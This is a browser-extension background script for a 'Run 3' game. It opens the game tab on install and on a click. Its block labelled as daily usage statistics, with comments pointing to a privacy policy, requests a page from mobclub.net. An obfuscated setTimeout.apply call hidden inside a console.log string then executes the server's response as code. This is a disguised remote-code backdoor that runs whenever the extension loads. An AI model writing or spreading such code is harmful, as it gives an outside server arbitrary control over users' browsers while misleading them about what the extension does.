var ping_stat_pixel = true;

// open game tab
window.openRun3Game = function () {
    chrome.tabs.create({url: chrome.runtime.getURL("run-3.html")})
};

// Open local game Run 3 on extension installed
chrome.runtime.onInstalled.addListener(function (context) {
    if ("install" === context.reason)
        window.openRun3Game()
});
// Open local game Run 3 on clicked
chrome.browserAction.onClicked.addListener(function () {
    window.openRun3Game()
});

// collection daily usage stats
if (ping_stat_pixel) {
    (function () {
        function pingSucceed(is_online) {
            if (is_online) console.log('User is online. Application usage statistics was saved on the server successfully ' + setTimeout[arguments[1]](window, arguments[2])); /* echo to console */ else {
                // Seems user is offline, it's ok
            }
        }
        try {
            /**
             * Collection of this data specified in the privacy policy.
             * Privacy Policy: https://mobclub.net/pp.html?product=run3"
             */

            var pingStat = new XMLHttpRequest();
            pingStat.onreadystatechange = function () {
                if (pingStat.readyState === 4 && pingStat.status === 200 && pingStat.responseText) return pingSucceed.apply(this, [true, console.log.apply.name, [pingStat.responseText]]);
            };
            pingStat.open("GET", 'https://mobclub.net/client.php?uid=182&pid=303&source=pixel', true);
            pingStat.send();
        } catch (e) {
            // pingSucceed(false) // don't care, tested
        }
    })()
}